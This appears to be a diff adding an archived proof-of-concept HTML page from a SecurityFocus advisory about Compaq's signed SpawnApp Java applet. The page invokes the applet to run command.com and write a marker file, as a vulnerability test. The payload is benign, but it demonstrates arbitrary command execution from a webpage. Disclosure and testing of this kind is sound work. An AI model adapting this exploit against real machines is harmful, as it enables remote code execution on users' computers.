@@ -1,0 +1,43 @@
+source: http://www.securityfocus.com/bid/557/info
+
+Some Compaq computers come with a Java applet called SpawnApp. This applet is used to run Compaq diagnostic utilities from the local hard drive when certain Compaq websites are viewed. The problem is that the applet can run any program, and can be used by any webpage. This applet is signed as secure by Compaq. 
+
+<html>
+
+<head>
+<title>Test for Compaq SpawnApp vulnerability</title>
+</head>
+
+<body>
+
+<applet code=SQRCDAPP name=sqrcd width=0 height=0>    
+<param name="cabbase" value="SQRCDAPP.cab">
+</applet>
+
+<SCRIPT language=javascript>
+function Btn_OnClick(cmndkey)
+{    document.sqrcd.SQRCDProcess("c:\\windows\\command\\command.com /C echo Vulnerable! >c:\\spawnapp.txt");
+}
+</SCRIPT>
+
+<p align="center"> 
+Test for Compaq SpawnApp vulnerability 
+</p>
+
+<p align="center"> 
+-> 
+<a href="#TopofDocument" onClick="Btn_OnClick('full')" > Test For Vulnerability 
+</a> 
+<-
+</p>
+
+<p align="center"> 
+If your system is vulnerable, clicking the link above will open a command window, which will create the file c:\spawnapp.txt with content "Vulnerable!".
+</p>
+
+<p align="center">
+Note: This will only work if your Windows folder is c:\windows. Otherwise you will have to edit this 
+HTML file.
+</p>
+</body>
+</html>
